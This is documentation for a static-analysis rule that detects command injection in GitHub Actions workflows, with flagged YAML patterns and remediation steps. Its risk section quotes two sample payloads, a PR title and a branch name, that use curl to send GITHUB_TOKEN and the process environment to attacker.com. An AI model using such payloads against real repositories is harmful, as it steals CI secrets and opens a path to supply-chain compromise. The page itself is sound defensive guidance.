---
title: "VNX-SEC-023 – GitHub Actions Expression Injection"
description: "Detect GitHub Actions workflows that inject untrusted event data (PR title, branch name, comment body) directly into run: commands, enabling shell command injection in CI/CD pipelines."
---

## Overview

This rule detects GitHub Actions workflows that embed untrusted `github.event` data — such as pull request titles, branch names, or issue comment bodies — directly into `run:` shell commands using expression syntax (`${{ }}`). An attacker who controls these values (by opening a PR, creating a branch, or posting a comment) can inject arbitrary shell commands that execute in the CI runner with the workflow's permissions.

**Severity:** Critical | **CWE:** [CWE-77 – Improper Neutralization of Special Elements used in a Command](https://cwe.mitre.org/data/definitions/77.html)

## Why This Matters

GitHub Actions expression injection is a supply chain attack vector with severe consequences:

- **CI runners have secrets.** Workflows typically have access to `GITHUB_TOKEN`, deployment keys, signing credentials, cloud provider tokens, and package registry credentials
- **No privilege boundary.** The injected command runs with the full permissions of the workflow — if it has `contents: write`, the attacker can push code; if it has `packages: write`, they can publish packages
- **Any contributor can exploit it.** Opening a pull request does not require write access to the repository. An attacker can craft a PR title like `"; curl attacker.com/steal?t=$GITHUB_TOKEN #` to exfiltrate secrets
- **Branch names are fully attacker-controlled.** An attacker can create a branch named `$(curl attacker.com/$(cat /proc/self/environ | base64))` and open a PR
- **GitHub does not sanitize expressions.** `${{ github.event.pull_request.title }}` is interpolated verbatim into the shell command before execution

## What Gets Flagged

**Pattern 1: Event data in run: commands**

```yaml
# Flagged: PR title injected into shell command
- run: echo "PR Title: ${{ github.event.pull_request.title }}"

# Flagged: PR body in run command
- run: |
    body="${{ github.event.pull_request.body }}"
    echo "$body" | grep "JIRA"

# Flagged: issue comment body
- run: echo "${{ github.event.comment.body }}"
```

**Pattern 2: Branch ref in run: commands**

```yaml
# Flagged: head_ref is attacker-controlled
- run: echo "Branch: ${{ github.head_ref }}"

# Flagged: used in a script
- run: git checkout ${{ github.head_ref }}
```

The rule applies only to files within `.github/workflows/`.

## Remediation

1. **Use an intermediate environment variable.** This is the recommended fix — environment variables are passed as data, not interpreted as shell syntax:

   ```yaml
   # Safe: env var is not subject to shell injection
   - name: Echo PR title safely
     env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: echo "PR Title: $PR_TITLE"
   ```

2. **Use `github.event.pull_request.number` instead of title/body for identification.** The PR number is an integer and safe to interpolate:

   ```yaml
   # Safe: PR number is an integer
   - run: echo "Processing PR #${{ github.event.pull_request.number }}"
   ```

3. **For branch-based operations, use `actions/checkout` instead of raw git commands:**

   ```yaml
   # Safe: the action handles ref resolution securely
   - uses: actions/checkout@v4
     with:
       ref: ${{ github.event.pull_request.head.sha }}
   ```

4. **If you must process event data, use a script file instead of inline shell:**

   ```yaml
   - name: Process PR data
     uses: actions/github-script@v7
     with:
       script: |
         // Safe: data is handled as a JavaScript string, not shell
         const title = context.payload.pull_request.title;
         console.log(`Title: ${title}`);
   ```

5. **Restrict workflow permissions to the minimum needed.** Even if injection occurs, limit the blast radius:

   ```yaml
   permissions:
     contents: read    # Not write
     pull-requests: read
   ```

6. **Use `pull_request` trigger instead of `pull_request_target`** when possible. `pull_request` runs in the context of the fork with reduced permissions, while `pull_request_target` runs with the base repository's secrets.

## References

- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
- [GitHub Security Lab: Keeping Your GitHub Actions and Workflows Secure](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1195.001 – Supply Chain Compromise: Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/)
- [OWASP CI/CD Security Risks – Poisoned Pipeline Execution](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [Cycode: GitHub Actions Expression Injection](https://cycode.com/blog/github-actions-vulnerabilities/)
